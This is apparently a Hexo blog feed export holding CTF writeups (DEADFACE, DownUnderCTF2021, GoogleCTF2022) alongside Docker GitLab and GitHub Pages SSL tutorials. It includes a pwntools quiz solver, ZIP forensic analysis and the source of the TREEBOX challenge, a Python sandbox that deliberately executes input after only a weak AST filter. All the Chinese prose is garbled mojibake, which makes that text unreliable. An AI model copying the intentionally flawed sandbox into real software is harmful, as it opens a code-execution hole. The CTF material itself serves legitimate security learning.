<p><img data-src="/../../CTF/DEADFACECTF/Traffic_Analysis/images/lytton-crypt-02.png" alt="lytton-crypt"></p>
<p>é‡å¤ä¸Šè¿°æ­¥éª¤,å¾—åˆ°<code>lytton-crypt.bin</code>.ç„¶åè®¡ç®—ä¸¤ä¸ªæ–‡ä»¶çš„md5å€¼</p>
<pre><code class="shell">â•­â”€ ~/CTF/DEADFACE
â•°â”€$ md5 lytton-crypt.*
MD5 (lytton-crypt.bin) = 4da8e81ee5b08777871e347a6b296953
MD5 (lytton-crypt.exe) = 9cb9b11484369b95ce35904c691a5b28
</code></pre>
<p><strong>flag:</strong><code>flag&#123;9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>DEADFACECTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockeræ­å»ºGitlabä»“åº“</title>
    <url>/posts/151510421/</url>
    <content><![CDATA[<h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><ol>
<li>æ‹‰å–Gitlabé•œåƒ<br><code>docker pull gitlab/gitlab-ce</code></li>
</ol>
<img data-src="/posts/151510421/pasted-1.png" class="">

<ol start="2">
<li><p>åˆ›å»ºæ–‡ä»¶å¤¹<br><code>mkdir gitlab</code></p>
<span id="more"></span>
</li>
<li><p>åˆ›å»ºå®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d  -p 8001:8001 -p 222:22 --name gitlab   \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/config&quot;</span>:/etc/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/logs&quot;</span>:/var/log/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/data&quot;</span>:/var/opt/gitlab \</span><br><span class="line">    --restart=always gitlab/gitlab-ce</span><br></pre></td></tr></table></figure></li>
</ol>
<div class="note info">
            <p>ä¹Ÿå¯ä»¥å°†8001ä¿®æ”¹ä¸ºå…¶ä»–ç«¯å£</p>
          </div>

<h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><ol>
<li><p>ä¿®æ”¹é…ç½®æ–‡ä»¶<br><code>vi gitlab/config/gitlab.rb</code><br><code>external_url &#39;http://www.xxx.com:8001&#39;</code> or <code>external_url &#39;http://&#123;ip&#125;:8001&#39;</code></p>
</li>
<li><p>é‡å¯å®¹å™¨<br><code>docker restart gitlab</code></p>
</li>
</ol>
<h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><ol>
<li>é¦–æ¬¡æ‰“å¼€æ—¶éœ€è¦è®¾ç½®ç®¡ç†å‘˜å¯†ç <img data-src="/posts/151510421/pasted-2.jpg" class=""></li>
<li>æŸ¥çœ‹Cloneä¿¡æ¯<img data-src="/posts/151510421/pasted-0.png" class=""></li>
</ol>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <tags>
        <tag>Gitlab</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Github pagesä¸ªäººåŸŸåæ·»åŠ SSL</title>
    <url>/posts/18543/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¯’å‡çš„æ—¶å€™ç”¨Hexo+Github pagesæ­å»ºäº†å±äºè‡ªå·±çš„åšå®¢ï¼Œå‰ä¸ä¹…æ‰ç»‘å®šäº†ä¸ªäººåŸŸåã€‚ä½œä¸ºä¸€åæœ‰å¼ºè¿«ç—‡çš„ç¨‹åºçŒ¿ï¼Œè‚¯å®šè¿˜è¦ç»™è‡ªå·±åŠ ä¸€ä¸ªç»¿è‰²çš„å°é”å¤´ã€‚<br>åœ¨ç½‘ä¸Šçœ‹åˆ«äººçš„åšå®¢ï¼Œå¤§éƒ¨åˆ†æ˜¯ç”¨çš„<a href="https://www.cloudflare.com/">CloudFlare</a>æä¾›çš„å…è´¹httpsæœåŠ¡ï¼Œä¹Ÿæœ‰é‡‡ç”¨çš„é˜¿é‡Œäº‘æä¾›çš„ä¸€å¹´å…è´¹è¯ä¹¦ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯åè€…ã€‚</p>
<span id="more"></span>
<h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><ul>
<li>ä¸ªäººåŸŸå:<a href="https://zhaoqi99.github.io/">https:&#x2F;&#x2F;èµµæ——.top&#x2F;</a></li>
<li>Github pages</li>
<li>é˜¿é‡Œäº‘è´­ä¹°çš„SSLè¯ä¹¦</li>
</ul>
<h2 id="æ·»åŠ SSLè¯ä¹¦"><a href="#æ·»åŠ SSLè¯ä¹¦" class="headerlink" title="æ·»åŠ SSLè¯ä¹¦"></a>æ·»åŠ SSLè¯ä¹¦</h2><ol>
<li>è¿›å…¥é˜¿é‡Œäº‘æ§åˆ¶å°ï¼Œä¾æ¬¡ç‚¹å‡»å®‰å…¨(äº‘ç›¾)-&gt;CAè¯ä¹¦æœåŠ¡ï¼Œç„¶åç‚¹å‡»å³ä¸Šè§’çš„è´­ä¹°è¯ä¹¦ã€‚<br><img data-src="/images/20180410134416.jpg"></li>
<li>ä¾æ¬¡é€‰æ‹©å“ç‰Œä¸º<code>Symantec</code>ï¼Œä¿æŠ¤ç±»å‹ä¸º<code>ä¸€ä¸ªåŸŸå</code>ï¼Œè¯ä¹¦ç±»å‹æ­¤æ—¶ä¼šå¤šå‡ºä¸€ä¸ªé€‰é¡¹<code>å…è´¹å‹DV SSL</code>ç‚¹å‡»é€‰æ‹©,ç„¶åç‚¹å‡»ç«‹å³è´­ä¹°ï¼Œæ”¯ä»˜0.00å…ƒã€‚<br><img data-src="/images/20180410134752.jpg"><br><img data-src="/images/20180410113516.jpg"><div class="note danger no-icon"><p>æ³¨æ„:å…è´¹çš„SSLè¯ä¹¦æœ‰æ•ˆæœŸåªæœ‰ä¸€å¹´ï¼Œè¿‡æœŸä¹‹åå°±éœ€è¦é‡æ–°ç”³è¯·äº†ã€‚
</p></div></li>
<li>æ”¯ä»˜æˆåŠŸåï¼Œç‚¹å‡»è¿›å…¥è¯ä¹¦æ§åˆ¶å°ï¼Œç„¶åç‚¹å‡»<code>è¡¥å…¨</code>ï¼Œå¡«å†™ç›¸å…³ä¿¡æ¯ï¼Œæäº¤ç”³è¯·ã€‚<br><img data-src="/images/20180410140626.jpg"><br><img data-src="/images/20180410113758.jpg"><div class="note warning"><p>
åŸŸåéªŒè¯ç±»å‹é€‰é¡¹è®°å¾—å‹¾é€‰:è¯ä¹¦ç»‘å®šçš„åŸŸååœ¨ã€é˜¿é‡Œäº‘çš„äº‘è§£æã€‘äº§å“ä¸­ï¼Œæˆæƒç³»ç»Ÿè‡ªåŠ¨æ·»åŠ ä¸€æ¡è®°å½•ä»¥å®ŒæˆåŸŸåæˆæƒéªŒè¯ã€‚
</p></div></li>
<li>ç­‰å¾…20åˆ†é’Ÿå·¦å³ï¼Œå³å¯æ”¶åˆ°ç­¾å‘æˆåŠŸçš„é€šçŸ¥äº†ï¼Œä¹Ÿå¯ä»¥åœ¨è¯ä¹¦æ§åˆ¶å°ä¸­å®æ—¶çœ‹åˆ°å®¡æ ¸è¿›åº¦ã€‚</li>
<li>åœ¨æµè§ˆå™¨ä¸­è¾“å…¥https:&#x2F;&#x2F;åŸŸå&#x2F; ï¼Œå¯ä»¥çœ‹åˆ°åœ°å€æ å‰é¢æœ‰ä¸€ä¸ªå°ç»¿é”ï¼Œå¾ˆæƒŠå–œæœ‰æ²¡æœ‰~<br><img data-src="/images/20180410140910.jpg"></li>
</ol>
<h2 id="httpå¼ºåˆ¶è·³è½¬https"><a href="#httpå¼ºåˆ¶è·³è½¬https" class="headerlink" title="httpå¼ºåˆ¶è·³è½¬https"></a>httpå¼ºåˆ¶è·³è½¬https</h2><p>æŒ‰ç…§ä¸Šè¿°æ­¥éª¤æ·»åŠ äº†SSLè¯ä¹¦åï¼Œå‘ç°å¦‚æœåœ¨åœ°å€æ ä¸­è¾“å…¥çš„æ˜¯https:&#x2F;&#x2F;åŸŸå&#x2F; å°±ä¼šæœ‰ç»¿é”å¤´ï¼Œå¦‚æœè¾“å…¥çš„æ˜¯http:&#x2F;&#x2F;åŸŸå&#x2F; ï¼Œåˆ™è¿˜æ˜¯http,å¹¶ä¸ä¼šè‡ªåŠ¨è·³è½¬è‡³httpsã€‚æ€æ ·è®©è®¿å®¢ç‚¹å‡»http:&#x2F;&#x2F;åŸŸå&#x2F; æ—¶èƒ½å¼ºåˆ¶è·³è½¬åˆ°httpså‘¢ï¼Ÿ<br>åœ¨Googleä¸Šçœ‹äº†å¥½å¤šçš„åšå®¢éƒ½æ²¡èƒ½æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œçªç„¶å‘ç°Githubä¸Šæœ‰ä¸€ä¸ª<code>Enforce HTTPS</code>é€‰é¡¹ï¼ŒæŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€ï¼Œæœ€åç«Ÿç„¶æˆåŠŸäº†ã€‚</p>
<ol>
<li>ç™»å½•Githubï¼Œè¿›å…¥è‡ªå·±çš„Github.ioé¡¹ç›®ä¸­ï¼Œç‚¹å‡»<code>Setting</code>ï¼Œå¾€ä¸‹æ‹‰ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸ªé€‰é¡¹å«<code>Enforce HTTPS</code>,ç‚¹å‡»å‹¾é€‰ã€‚<br><img data-src="/images/20180410115944.jpg"></li>
<li>æ‰“å¼€æµè§ˆå™¨ï¼Œåœ¨åœ°å€ä¸­è¾“å…¥è‡ªå·±çš„http:&#x2F;&#x2F;åŸŸå&#x2F; ï¼Œå·²ç»å¯ä»¥è‡ªåŠ¨è·³è½¬åˆ°httpsä¸‹äº†ï¼Œå¤§åŠŸå‘Šæˆã€‚</li>
</ol>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>DownUnderCTF2021 Writeup</title>
    <url>/posts/2302350511/</url>
    <content><![CDATA[<h1 id="Retro"><a href="#Retro" class="headerlink" title="Retro!"></a>Retro!</h1><p><em>Our original logo was created in paint, I wonder what other secrets it hides?</em></p>
<hr>
<p>é¢˜ç›®ç»™äº†ä¸€å¼ å›¾ç‰‡:</p>
<img data-src="../../CTF/DownUnderCTF2021/Forensics/assets/og.jpg" alt="og" style="zoom:30%;" />

<p>ä½¿ç”¨<code>exiftool</code>å·¥å…·æŸ¥çœ‹å›¾ç‰‡å…ƒæ•°æ®:</p>
<p><img data-src="/../../CTF/DownUnderCTF2021/Forensics/assets/exiftool.png" alt="exiftool"></p>
<p><strong>flag:</strong><code>DUCTF&#123;sicc_paint_skillz!&#125;</code></p>
<h1 id="General-Skills-Quiz"><a href="#General-Skills-Quiz" class="headerlink" title="General Skills Quiz"></a>General Skills Quiz</h1><p><em>QUIZ TIME! Just answer the questions. Pretty easy right?</em></p>
<p><em>Author: Crem</em></p>
<p><em><code>nc pwn-2021.duc.tf 31905</code></em></p>
<hr>
<p>æœ¬é¢˜è¦æ±‚ä½¿ç”¨<code>nc</code>å‘½ä»¤è¿æ¥è¿œç¨‹æœåŠ¡å™¨,å¹¶åœ¨30så†…å›ç­”æ‰€æœ‰é—®é¢˜.</p>
<p>ä»£ç :</p>
<pre><code class="python">from pwn import *
from urllib.parse import unquote
import base64

def rot13(message):
    PAIRS = dict(zip(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;,
                     &quot;nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM&quot;))
    return &quot;&quot;.join(PAIRS.get(c, c) for c in message)

p = remote(&#39;pwn-2021.duc.tf&#39;, 31905)
p.send(b&#39;\n&#39;)
p.recvuntil(b&#39;ticking...&#39;, drop=True)
p.recvline()

while True:
    s = p.recvline().decode(&#39;utf-8&#39;).strip(&#39;\n&#39;)
    print(s)
    t = s.split()[-1]
    print(t)
    if &#39;1+1=?&#39; in s:
        p.send(&#39;2&#39;.encode())
    elif &#39;Decode this hex string and provide me the original number (base 10)&#39; in s:
        p.send(str(int(t, 16)).encode())
    elif &#39;Decode this hex string and provide me the original ASCII letter&#39; in s:
        p.send(chr(int(t, 16)).encode())
    elif &#39;Decode this URL encoded string and provide me the original ASCII symbols&#39; in s:
        p.send(unquote(t).encode())
    elif &#39;Decode this base64 string and provide me the plaintext&#39; in s:
        p.send(base64.b64decode(t))
    elif &#39;Encode this plaintext string and provide me the Base64&#39; in s:
        p.send(base64.b64encode(t.encode()))
    elif &#39;Decode this rot13 string and provide me the plaintext&#39; in s:
        p.send(rot13(t).encode())
    elif &#39;Encode this plaintext string and provide me the ROT13&#39; in s:
        p.send(rot13(t).encode())
    elif &#39;Decode this binary string and provide me the original number&#39; in s:
        p.send(str(int(t, 2)).encode())
    elif &#39;Encode this number and provide me the binary equivalent&#39; in s:
        p.send(bin(int(t)).encode())
    else:
        p.send(&#39;DUCTF\n&#39;.encode())
        print(p.recvall().decode())
        break
    p.send(&#39;\n&#39;.encode())
    p.recvline()
    p.recvline()
</code></pre>
<p><strong>flag:</strong><code>DUCTF&#123;you_aced_the_quiz!_have_a_gold_star_champion&#125;</code></p>
<h1 id="Who-goes-there"><a href="#Who-goes-there" class="headerlink" title="Who goes there?"></a>Who goes there?</h1><p><em>Disclaimer: Please note that this storyline, including any previous or future additions are all fictional and created solely for this challenge as part of DownUnder CTF. These are real places however they have <strong>no association&#x2F;affiliation</strong> to the event, you are not required to call any place or make contact with anyone, doing so may disqualify you from the event.</em></p>
<p><em>Welcome to the team, glad you chose to join us - hopefully youâ€™ll like it here and want to stay. Let me tell you about your first task:</em></p>
<p><em>Weâ€™ve observed an underground criminal RaaS operation calling back to this domain, can you find the number of the individual who registered the domain?</em></p>
<p><code>646f776e756e646572.xyz</code></p>
<hr>
<p>é¢˜ç›®ç»™äº†æˆ‘ä»¬ä¸€ä¸ªåŸŸå,è¦æ±‚æˆ‘ä»¬æ‰¾åˆ°æ³¨å†Œäººçš„è”ç³»ç”µè¯</p>
<p>åœ¨<a href="https://who.is/whois/646f776e756e646572.xyz">whois</a>ä¸Šæœç´¢å³å¯:</p>
<p><img data-src="/../../CTF/DownUnderCTF2021/OSINT/assets/whois.png" alt="Whois"></p>
<p><strong>flag:</strong><code>DUCTF&#123;+61.420091337&#125;</code></p>
<h1 id="no-strings"><a href="#no-strings" class="headerlink" title="no strings"></a>no strings</h1><p><em>This binary contains a free flag. No strings attached, seriously!</em></p>
<hr>
<p>ä½¿ç”¨<code>hexdump -C nostrings</code>æŸ¥çœ‹16è¿›åˆ¶:</p>
<pre><code class="assembly">00002000  01 00 02 00 00 00 00 00  44 00 55 00 43 00 54 00  |........D.U.C.T.|
00002010  46 00 7b 00 73 00 74 00  72 00 69 00 6e 00 67 00  |F.&#123;.s.t.r.i.n.g.|
00002020  65 00 6e 00 74 00 5f 00  73 00 74 00 72 00 69 00  |e.n.t._.s.t.r.i.|
00002030  6e 00 67 00 73 00 5f 00  73 00 74 00 72 00 69 00  |n.g.s._.s.t.r.i.|
00002040  6e 00 67 00 7d 00 66 6c  61 67 3f 20 00 77 72 6f  |n.g.&#125;.flag? .wro|
00002050  6e 67 21 00 63 6f 72 72  65 63 74 21 00 00 00 00  |ng!.correct!....|
00002060  01 1b 03 3b 34 00 00 00  05 00 00 00 c0 ef ff ff  |...;4...........|
00002070  68 00 00 00 20 f0 ff ff  50 00 00 00 19 f1 ff ff  |h... ...P.......|
00002080  90 00 00 00 f0 f1 ff ff  b8 00 00 00 60 f2 ff ff  |............`...|
00002090  00 01 00 00 00 00 00 00  14 00 00 00 00 00 00 00  |................|
000020a0  01 7a 52 00 01 78 10 01  1b 0c 07 08 90 01 00 00  |.zR..x..........|
000020b0  14 00 00 00 1c 00 00 00  c8 ef ff ff 2f 00 00 00  |............/...|
000020c0  00 44 07 10 00 00 00 00  24 00 00 00 34 00 00 00  |.D......$...4...|
000020d0  50 ef ff ff 60 00 00 00  00 0e 10 46 0e 18 4a 0f  |P...`......F..J.|
000020e0  0b 77 08 80 00 3f 1a 3b  2a 33 24 22 00 00 00 00  |.w...?.;*3$&quot;....|
000020f0  24 00 00 00 5c 00 00 00  81 f0 ff ff d2 00 00 00  |$...\...........|
00002100  00 41 0e 10 86 02 43 0d  06 45 83 03 02 c8 0c 07  |.A....C..E......|
00002110  08 00 00 00 00 00 00 00  44 00 00 00 84 00 00 00  |........D.......|
00002120  30 f1 ff ff 65 00 00 00  00 46 0e 10 8f 02 49 0e  |0...e....F....I.|
00002130  18 8e 03 45 0e 20 8d 04  45 0e 28 8c 05 44 0e 30  |...E. ..E.(..D.0|
00002140  86 06 48 0e 38 83 07 47  0e 40 6e 0e 38 41 0e 30  |..H.8..G.@n.8A.0|
00002150  41 0e 28 42 0e 20 42 0e  18 42 0e 10 42 0e 08 00  |A.(B. B..B..B...|
00002160  10 00 00 00 cc 00 00 00  58 f1 ff ff 05 00 00 00  |........X.......|
00002170  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
</code></pre>
<p><strong>flag:</strong><code>DUCTF&#123;stringent_strings_string&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>DownUnderCTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>GoogleCTF2022 Writeup</title>
    <url>/posts/632988450/</url>
    <content><![CDATA[<h1 id="APPNOTE-TXT"><a href="#APPNOTE-TXT" class="headerlink" title="APPNOTE.TXT"></a>APPNOTE.TXT</h1><p><em>Every single archive manager unpacks this to a different file...</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/2551253642bde3066e55c9cc8e9b0b4aa77feadc00c81032da778e6f7c89907135dfc2611fd8617204720dbfadb31429ae11f6ecd202887f4ce99f2f53a3c5e8">Attachment</a></em></p>
<hr>
<p>è§£å‹ä¸‹è½½å¾—åˆ°çš„æ–‡ä»¶<code>dump.zip</code>,å¾—åˆ°<code>hello.txt</code>: <code>There&#39;s more to it than meets the eye...</code></p>
<p>çŒœæµ‹å¯èƒ½æœ‰éšè—æ–‡ä»¶,ç”¨<code>binwalk</code>åˆ†æ:</p>
<ul>
<li>æ–‡ä»¶åä»<code>flag00.zip</code>åˆ°<code>flag18.zip</code></li>
<li>æ¯ä¸ªæ–‡ä»¶åå‡ºç°36æ¬¡</li>
</ul>
<pre><code class="bash">~$ binwalk dump.zip

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, v0.0 compressed size: 41, uncompressed size: 41, name: hello.txt
135           0x87            Zip archive data, v0.0 compressed size: 33, uncompressed size: 33, name: hi.txt
256           0x100           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
345           0x159           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
434           0x1B2           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
523           0x20B           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
612           0x264           Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag00
...
60598         0xECB6          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
60687         0xED0F          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
60776         0xED68          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
60865         0xEDC1          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
60954         0xEE1A          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
61043         0xEE73          Zip archive data, v0.0 compressed size: 1, uncompressed size: 1, name: flag18
61572         0xF084          End of Zip archive, footer length: 22
</code></pre>
<p>ä½¿ç”¨<code>strings</code>å’Œ<code>hexdump</code>åˆ†æ,å‘ç°:</p>
<ul>
<li>åŒ…å«æ–‡ä»¶<code>hi.txt</code>: <code>Find a needle in the haystack...</code></li>
<li>çŒœæµ‹flagçš„é•¿åº¦ä¸º18,æ¯ç»„<code>flagXX</code>è¡¨ç¤ºäº†flagä¸­çš„ä¸€ä¸ªå­—ç¬¦</li>
<li>dumpå‡ºæ¥ä»»æ„ä¸€ç»„<code>flagXX</code>,å¾—åˆ°flagçš„å­—æ¯è¡¨<code>abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_</code></li>
<li>å·²çŸ¥flagæ ¼å¼ä¸º<code>CTF&#123;...&#125;</code></li>
</ul>
<pre><code class="bash">~$ strings dump.zip
V~uK)
hello.txtThere&#39;s more to it than meets the eye...
V~uK)
hello.txtPK
hi.txtFind a needle in the haystack...
hi.txtPK
flag00aPK
flag00PK
flag00bPK
flag00PK
flag00cPK
flag00PK
flag00dPK
flag00PK
flag00ePK
......
flag18PK
flag181PK
flag18PK
flag183PK
flag18PK
flag187PK
flag18PK
flag18&#125;PK
flag18PK
flag18_PK
flag18PK
</code></pre>
<pre><code class="bash">~$ hexdump -C dump.zip | head -n 30
00000000  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 56 7e  |PK............V~|
00000010  75 4b 29 00 00 00 29 00  00 00 09 00 00 00 68 65  |uK)...).......he|
00000020  6c 6c 6f 2e 74 78 74 54  68 65 72 65 27 73 20 6d  |llo.txtThere&#39;s m|
00000030  6f 72 65 20 74 6f 20 69  74 20 74 68 61 6e 20 6d  |ore to it than m|
00000040  65 65 74 73 20 74 68 65  20 65 79 65 2e 2e 2e 0a  |eets the eye....|
00000050  50 4b 01 02 00 00 00 00  00 00 00 00 00 00 00 00  |PK..............|
00000060  56 7e 75 4b 29 00 00 00  29 00 00 00 09 00 00 00  |V~uK)...).......|
00000070  fd ef 00 00 00 00 00 00  00 00 00 00 00 00 68 65  |..............he|
00000080  6c 6c 6f 2e 74 78 74 50  4b 03 04 00 00 00 00 00  |llo.txtPK.......|
00000090  00 00 00 00 00 9a 15 62  e9 21 00 00 00 21 00 00  |.......b.!...!..|
000000a0  00 06 00 00 00 68 69 2e  74 78 74 46 69 6e 64 20  |.....hi.txtFind |
000000b0  61 20 6e 65 65 64 6c 65  20 69 6e 20 74 68 65 20  |a needle in the |
000000c0  68 61 79 73 74 61 63 6b  2e 2e 2e 0a 50 4b 01 02  |haystack....PK..|
000000d0  00 00 00 00 00 00 00 00  00 00 00 00 9a 15 62 e9  |..............b.|
000000e0  21 00 00 00 21 00 00 00  06 00 00 00 84 ef 00 00  |!...!...........|
000000f0  00 00 00 00 00 00 87 00  00 00 68 69 2e 74 78 74  |..........hi.txt|
00000100  50 4b 03 04 00 00 00 00  00 00 00 00 00 00 43 be  |PK............C.|
00000110  b7 e8 01 00 00 00 01 00  00 00 06 00 00 00 66 6c  |..............fl|
00000120  61 67 30 30 61 50 4b 01  02 00 00 00 00 00 00 00  |ag00aPK.........|
00000130  00 00 00 00 00 43 be b7  e8 01 00 00 00 01 00 00  |.....C..........|
00000140  00 06 00 00 00 2b ef 00  00 00 00 00 00 00 00 00  |.....+..........|
00000150  01 00 00 66 6c 61 67 30  30 50 4b 03 04 00 00 00  |...flag00PK.....|
00000160  00 00 00 00 00 00 00 f9  ef be 71 01 00 00 00 01  |..........q.....|
00000170  00 00 00 06 00 00 00 66  6c 61 67 30 30 62 50 4b  |.......flag00bPK|
00000180  01 02 00 00 00 00 00 00  00 00 00 00 00 00 f9 ef  |................|
00000190  be 71 01 00 00 00 01 00  00 00 06 00 00 00 d2 ee  |.q..............|
000001a0  00 00 00 00 00 00 00 00  59 01 00 00 66 6c 61 67  |........Y...flag|
000001b0  30 30 50 4b 03 04 00 00  00 00 00 00 00 00 00 00  |00PK............|
000001c0  6f df b9 06 01 00 00 00  01 00 00 00 06 00 00 00  |o...............|
000001d0  66 6c 61 67 30 30 63 50  4b 01 02 00 00 00 00 00  |flag00cPK.......|
</code></pre>
<p>å‚ç…§ZIPæ–‡ä»¶æ ¼å¼,æŒ‰ç…§<code>504B0304</code>ã€<code>504B0102</code>ã€<code>504B0506</code>åˆ†éš”<code>dump.zip</code>çš„<a href="../../CTF/GoogleCTF2022/Misc/assets/hex.out">åå…­è¿›åˆ¶è¡¨ç¤ºå½¢å¼</a>,åˆ†æå‘ç°:</p>
<ul>
<li><code>hello.txt</code>å’Œ<code>hi.txt</code>ä¸€å…±å ç”¨256å­—èŠ‚</li>
<li><code>flagXX</code>çš„æ–‡ä»¶å®ä½“ä¸º37å­—èŠ‚ã€ç›®å½•æºæ•°æ®ä¸º52å­—èŠ‚</li>
<li>æ¯ç»„<code>flagXX</code>å…±å ç”¨(37 + 53) * 36å­—èŠ‚</li>
</ul>
<p><img data-src="/../../CTF/GoogleCTF2022/Misc/images/B04B0506.png" alt="B04B0506"></p>
<p>å‘ç°ç»“å°¾å¤šäº†18ä¸ªç›®å½•æ•°æ®æºç»“æŸæ ‡è¯†,çŒœæµ‹å¯èƒ½ä»¥æ­¤è¿˜åŸæ–‡ä»¶,ä»¥<code>flag00</code>ä¸ºä¾‹:</p>
<p>ç›®å½•æºæ•°æ®çš„å¼€å§‹ä½ç½®åç§»ä¸º<code>0x880A0000</code>,ç”¨å°ç«¯è¡¨ç¤ºä¸º<code>0x00000A88</code>(2696),å‡å»<code>hello.txt</code>å’Œ<code>hi.txt</code>çš„256å­—èŠ‚,å‡å»ç¬¬ä¸€ä¸ªæ–‡ä»¶å®ä½“çš„37å­—èŠ‚,ç„¶åé™¤ä»¥(37+52)å¾—åˆ°27,æŒ‡å‘<code>flag00</code>è¿™ä¸€ç»„çš„ç¬¬27ä¸ªæ–‡ä»¶å®ä½“(ä»0å¼€å§‹),å³å­—ç¬¦C.åŸºäºflagçš„æ ¼å¼ä»¥Cå¼€å¤´,å¤§èƒ†çŒœæµ‹è¿™å°±æ˜¯æ­£ç¡®ç­”æ¡ˆ.</p>
<p>å‰©ä¸‹çš„è¿‡ç¨‹ä¸ä¹‹ç±»ä¼¼,å¯ä»¥ä½¿ç”¨è„šæœ¬ç®€åŒ–:</p>
<pre><code class="python">data = &quot;&quot;&quot;\
880A0000
65170000
42240000
BB2F0000
6C380000
274A0000
7F520000
3A640000
71690000
377C0000
587F0000
F1950000
3E9D0000
5EA80000
88BC0000
92C50000
2CD40000
20DB0000
3FEE0000
&quot;&quot;&quot;.split()
print(len(data))

CHOICES = &#39;abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_&#39;
ans = list()

def conv(s):
      # å¤§ç«¯è½¬å°ç«¯
    a = [s[2 * i:2 * (i + 1)] for i in range(len(s) // 2)]
    a.reverse()
    return &#39;&#39;.join(a)

for i,item in enumerate(data):
    t = int(conv(item), 16) - 256 - 37
    tt = t // (37 + 52)
    ttt = tt - 36 * i
    ans.append(CHOICES[ttt])
    print(&#39;&#39;.join(ans))
</code></pre>
<p>flag:<code>CTF&#123;p0s7m0d3rn_z1p&#125;</code></p>
<p>å‚è€ƒ</p>
<ul>
<li><a href="https://xz.aliyun.com/t/3994">ä»åšCTFé¢˜åˆ°æ‰‹æ’•ZIP</a></li>
<li><a href="http://lordaeronesz.top/2021/08/29/ZIP%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">ZIPæ ¼å¼åˆ†æ</a></li>
<li><a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">.ZIP File Format Specification</a></li>
</ul>
<h1 id="TREEBOX"><a href="#TREEBOX" class="headerlink" title="TREEBOX"></a>TREEBOX</h1><p><em>I think I finally got Python sandboxing right.</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2022-attachments-project/17f98f8c9c9f8089ab3a35e94de752582253c3784637fe6ef6a561c12b817fcd7acf05a4573bff2cd43247f8e5263200aa29745605ae2719de774160bb21e301">Attachment</a> <code>treebox.2022.ctfcompetition.com 1337</code></em></p>
<hr>
<details>
<summary style="display: list-item;">treebox.py</summary>

<div markdown="1">

<pre><code class="python">#!/usr/bin/python3 -u
#
# Flag is in a file called &quot;flag&quot; in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update &amp;&amp; apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;)
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print(&quot;-- Please enter code (last line must contain only --END)&quot;)
source_code = &quot;&quot;
while True:
  line = sys.stdin.readline()
  if line.startswith(&quot;--END&quot;):
    break
  source_code += line

tree = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;, flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print(&quot;-- Executing safe code:&quot;)
  compiled = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;)
  exec(compiled)
</code></pre>
</div>
</details>

